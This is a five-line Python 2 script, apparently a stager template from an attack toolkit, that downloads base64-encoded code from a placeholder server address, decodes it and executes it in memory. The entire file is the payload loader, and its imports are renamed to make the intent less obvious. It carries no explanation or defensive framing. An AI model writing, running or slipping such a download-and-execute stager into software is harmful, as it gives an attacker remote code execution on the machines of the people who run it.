#!/usr/bin/env python
from urllib2 import urlopen as wget
from base64 import b64decode as decode
ns = {}
exec compile( decode( wget( "__SERVER__" ).read() ), "stager", "exec" ) in ns
